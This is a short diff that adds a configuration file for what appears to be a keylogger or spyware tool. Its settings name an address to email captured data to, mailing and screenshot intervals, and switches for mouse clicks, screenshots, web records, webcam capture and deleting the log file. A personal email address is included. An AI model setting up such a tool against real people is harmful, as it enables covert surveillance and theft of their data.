@@ -1,0 +1,8 @@
+reciver_email_address="thivankanimesh@hotmail.com"
+mailling_time_gap=20
+screen_shots_time_gap=20
+mouse_click_events=False
+screen_shots=False
+web_records=False
+web_cam=False
+delete_log_file=False
